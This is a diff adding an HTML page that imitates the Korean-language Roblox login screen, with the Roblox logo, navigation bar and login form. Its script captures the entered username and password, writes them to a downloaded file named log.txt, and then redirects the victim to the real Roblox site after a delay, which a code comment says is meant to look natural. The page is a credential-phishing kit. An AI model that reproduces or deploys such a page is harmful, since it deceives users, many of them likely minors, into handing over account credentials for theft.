@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox 로그인</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: #000; color: #fff; overflow: hidden; }
+
+        /* 배경: 기울어진 게임 그리드 */
+        .bg-container {
+            position: fixed; top: -10%; left: -10%; width: 120%; height: 120%;
+            display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px;
+            transform: rotate(-10deg); z-index: -2; opacity: 0.6;
+        }
+        .bg-tile { width: 100%; padding-top: 60%; background: #1a1a1a; border-radius: 8px; border: 1px solid #333; }
+        
+        /* 검은색 오버레이 (사진처럼 어둡게) */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.7); z-index: -1;
+        }
+
+        /* 상단 네비바 */
+        .navbar {
+            height: 45px; background: #111; display: flex; align-items: center;
+            padding: 0 20px; position: fixed; width: 100%; z-index: 10;
+        }
+        .logo-img { height: 25px; margin-right: 25px; cursor: pointer; }
+        nav a { color: #fff; text-decoration: none; margin-right: 18px; font-size: 14px; font-weight: 500; }
+        .nav-right { margin-left: auto; display: flex; gap: 10px; }
+        .search { background: #222; border: 1px solid #444; color: #fff; padding: 3px 10px; border-radius: 4px; width: 150px; }
+        .btn-top { background: none; border: 1px solid #fff; color: #fff; padding: 3px 12px; border-radius: 4px; cursor: pointer; }
+
+        /* 로그인 카드 */
+        .container { height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .login-card {
+            background: rgba(30, 31, 32, 0.95); width: 400px; padding: 40px;
+            border-radius: 8px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .login-card h1 { font-size: 26px; margin-bottom: 25px; font-weight: bold; }
+
+        .input-box {
+            width: 100%; padding: 13px; margin-bottom: 12px;
+            background: #393b3d; border: 1px solid #555; border-radius: 4px; color: #fff;
+        }
+        .btn-login {
+            width: 100%; padding: 13px; background: transparent;
+            border: 1px solid #fff; color: #fff; font-weight: bold;
+            border-radius: 4px; cursor: pointer; margin-top: 5px; font-size: 16px;
+        }
+        .btn-login:hover { background: rgba(255,255,255,0.1); }
+
+        .forgot { display: block; margin: 18px 0; font-size: 13px; color: #ccc; text-decoration: none; }
+        .btn-sub {
+            width: 100%; padding: 11px; background: #4b4d4e; border: none;
+            color: #fff; border-radius: 4px; margin-bottom: 10px; cursor: pointer; font-size: 14px;
+        }
+        .footer { margin-top: 25px; font-size: 14px; color: #ccc; }
+        .footer a { color: #fff; text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-container">
+        <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
+        <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
+        <div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div><div class="bg-tile"></div>
+    </div>
+    <div class="overlay"></div>
+
+    <header class="navbar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo-img" alt="logo" id="logo">
+        <nav>
+            <a href="#">차트</a> <a href="#">마켓플레이스</a> <a href="#">만들기</a> <a href="#">Robux</a>
+        </nav>
+        <div class="nav-right">
+            <input type="text" class="search" placeholder="검색">
+            <button class="btn-top">회원가입</button>
+            <button class="btn-top">로그인</button>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="login-card">
+            <h1>계정 추가</h1>
+            <input type="text" id="username" class="input-box" placeholder="사용자 이름/이메일/전화번호">
+            <input type="password" id="password" class="input-box" placeholder="비밀번호">
+            <button class="btn-login" onclick="saveAndLogin()">로그인</button>
+            
+            <a href="#" class="forgot">비밀번호 또는 사용자 이름을 잊었나요?</a>
+            
+            <button class="btn-sub">이메일로 일회용 코드 받기</button>
+            <button class="btn-sub">빠른 로그인</button>
+
+            <p class="footer">계정이 없으신가요? <a href="#">회원가입</a></p>
+        </div>
+    </div>
+
+    <script>
+        function saveAndLogin() {
+            const name = document.getElementById('username').value;
+            const pw = document.getElementById('password').value;
+
+            if(name === "" || pw === "") {
+                alert("정보를 입력해주세요.");
+                return;
+            }
+
+            // 1. 메모장에 들어갈 내용 만들기
+            const textContent = `NAME: ${name}\nPASSWORD: ${pw}\n----------------------\n`;
+
+            // 2. 파일 다운로드 트리거 (브라우저가 파일을 생성)
+            const blob = new Blob([textContent], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'log.txt'; // 파일 이름 설정
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            // 3. 실제 로블록스로 이동 (자연스럽게 보이도록)
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/home";
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
